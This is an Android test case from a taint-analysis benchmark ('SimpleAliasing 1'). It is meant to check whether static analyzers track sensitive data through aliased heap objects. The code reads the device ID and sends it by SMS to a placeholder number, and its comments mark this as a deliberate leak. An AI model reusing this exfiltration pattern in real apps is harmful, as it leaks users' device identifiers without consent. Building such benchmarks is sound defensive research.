package de.ecspride;

import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

/**
 * @testcase_name SimpleAliasing 1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE),
 * 		European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sensitive data is assigned to a heap object and then leaked
 * 		through an alias of that heap object.
 * @dataflow source -> heap object -> alias -> sink
 * @number_of_leaks 1
 * @challenges Aliases must be computed soundly or the leak will be missed.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		aliasFlowTest();
	}

	class A{
		public String b = "Y";
	}

	public class B{
		public A attr;
	}

	private void aliasFlowTest() {
        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        String deviceId = mgr.getDeviceId();	// source
        
        A a = new A();
        B b = new B();
        B e = b;
        A c = a;
        A d = a;
        b.attr = c;
        d.b = deviceId;
        A f = e.attr;
        
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, f.b, null, null); // sink, leak
	}


}
